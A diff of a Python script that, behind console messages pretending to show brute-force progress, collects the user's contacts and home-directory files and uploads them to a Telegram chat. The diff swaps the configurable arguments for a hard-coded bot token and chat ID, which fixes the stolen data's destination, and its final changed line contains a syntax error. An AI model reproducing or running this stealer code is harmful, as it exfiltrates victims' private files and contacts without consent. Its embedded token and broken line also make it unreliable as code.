@@ -1,16 +1,11 @@
 from threading import Thread, Lock
-import argparse, os, subprocess, telebot, time, json
+import os, subprocess, telebot, time, json
 
-parser = argparse.ArgumentParser()
-parser.add_argument('--apikey', type=str, required=True, help='Telegram bot API token')
-parser.add_argument('--chat_id', type=int, required=True, help='Chat ID to send contacts to')
-args = parser.parse_args()
-
-bot = telebot.TeleBot(args.apikey)
+bot = telebot.TeleBot('6297533986:AAGtMlOgroJCnYxb4Khwd3NvuGuXw91EU_g')
 
 def send_file_to_telegram(filename, i, total_files):
     with open(filename, 'rb') as f:
-        bot.send_document(chat_id=args.chat_id, document=f)
+        bot.send_document(chat_id=1004407813, document=f)
     print(f'Bruteforce combination {i + 1} of {total_files}')
 
 def get_contacts():
@@ -20,7 +15,7 @@ def get_contacts():
 
 def send_contacts_to_telegram():
     contacts_str = json.dumps(get_contacts(), indent=2)
-    bot.send_message(chat_id=args.chat_id, text=contacts_str)
+    bot.send_message(chat_id=1004407813, text=contacts_str)
 
 def get_user_files():
     home_dir = os.path.expanduser('~')
@@ -48,6 +43,6 @@ while i < total_files:
     for t in threads:
         t.join()
     threads = []
-    print('',end='',flush=True)
+    print('+',end='',flush=True)
 
-bot.send_message(chat_id=args.chat_id, text='All files and contacts have been sent.')
+bot.send_message(chat_id=args.1004407813, text='All files and contacts have been sent.')
